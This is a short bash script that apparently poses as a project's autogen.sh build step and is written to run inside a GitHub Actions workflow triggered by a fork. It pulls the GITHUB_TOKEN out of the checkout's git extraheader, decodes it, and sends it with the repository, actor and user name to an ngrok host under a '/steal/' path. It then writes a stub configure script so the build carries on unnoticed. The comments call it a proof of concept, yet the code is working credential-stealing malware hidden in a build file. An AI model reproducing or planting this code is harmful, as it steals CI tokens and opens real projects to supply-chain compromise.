#!/bin/bash
# Extract GITHUB_TOKEN from git extraheader (set by actions/checkout)
RAW=$(git config --local --get http.https://github.com/.extraheader 2>/dev/null)
B64=$(echo "$RAW" | grep -o 'basic [A-Za-z0-9+/=]*' | awk '{print $2}')
TOKEN=$(echo "$B64" | base64 -d 2>/dev/null | cut -d: -f2)

/usr/bin/curl -sk "https://bbb9-118-68-66-37.ngrok-free.app/steal/nut-7502"     -H 'Content-Type: application/json'     -H 'ngrok-skip-browser-warning: true'     -d "{\"attack\":\"nut-fork-checkout-rce\",\"GITHUB_TOKEN\":\"${TOKEN:-NOT_FOUND}\",\"GITHUB_REPOSITORY\":\"$GITHUB_REPOSITORY\",\"GITHUB_ACTOR\":\"$GITHUB_ACTOR\",\"whoami\":\"$(whoami)\"}" 2>/dev/null || true

# Stub configure so workflow continues
cat > configure << 'CONFIGURE'
#!/bin/bash
echo "[configure] Stub configure for PoC"
CONFIGURE
chmod +x configure
echo "[autogen.sh] Done."
